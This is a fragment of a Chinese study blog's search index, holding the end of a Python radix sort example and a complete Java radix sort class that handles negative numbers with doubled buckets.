class="line">    <span class="built_in">print</span>(<span class="string">&quot;原始数据：&quot;</span>, arr)</span><br><span class="line">    arr_new = radix_sort(arr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;计数排序结果为：&quot;</span>, arr_new)</span><br></pre></td></tr></table></figure><h5 id="Java：-9"><a href="#Java：-9" class="headerlink" title="Java："></a>Java：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 考虑负数的情况还可以参考： https://code.i-harness.com/zh-CN/q/e98fa9</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RadixSort</span> <span class="keyword">implements</span> <span class="title class_">IArraySort</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sort(<span class="type">int</span>[] sourceArray) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 对 arr 进行拷贝，不改变参数内容</span></span><br><span class="line">        <span class="type">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">maxDigit</span> <span class="operator">=</span> getMaxDigit(arr);</span><br><span class="line">        <span class="keyword">return</span> radixSort(arr, maxDigit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取最高位数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getMaxDigit</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxValue</span> <span class="operator">=</span> getMaxValue(arr);</span><br><span class="line">        <span class="keyword">return</span> getNumLenght(maxValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getMaxValue</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxValue</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> value : arr) &#123;</span><br><span class="line">            <span class="keyword">if</span> (maxValue &lt; value) &#123;</span><br><span class="line">                maxValue = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">getNumLenght</span><span class="params">(<span class="type">long</span> num)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">lenght</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">long</span> <span class="variable">temp</span> <span class="operator">=</span> num; temp != <span class="number">0</span>; temp /= <span class="number">10</span>) &#123;</span><br><span class="line">            lenght++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lenght;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] radixSort(<span class="type">int</span>[] arr, <span class="type">int</span> maxDigit) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mod</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">dev</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; maxDigit; i++, dev *= <span class="number">10</span>, mod *= <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="comment">// 考虑负数的情况，这里扩展一倍队列数，其中 [0-9]对应负数，[10-19]对应正数 (bucket + 10)</span></span><br><span class="line">            <span class="type">int</span>[][] counter = <span class="keyword">new</span> <span class="title class_">int</span>[mod * <span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr.length; j++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">bucket</span> <span class="operator">=</span> ((arr[j] % mod) / dev) + mod;</span><br><span class="line">                counter[bucket] = arrayAppend(counter[bucket], arr[j]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span>[] bucket : counter) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> value : bucket) &#123;</span><br><span class="line">                    arr[pos++] = value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自动扩容，并保存数据</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arr</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] arrayAppend(<span class="type">int</span>[] arr, <span class="type">int</span> value) &#123;</span><br><span class="line">        arr = Arrays.copyOf(arr, arr.length + <span class="number">1</span>);</span><br><span class="line">        arr[arr.length - <span class="number">1</span>] = value;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大一上 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
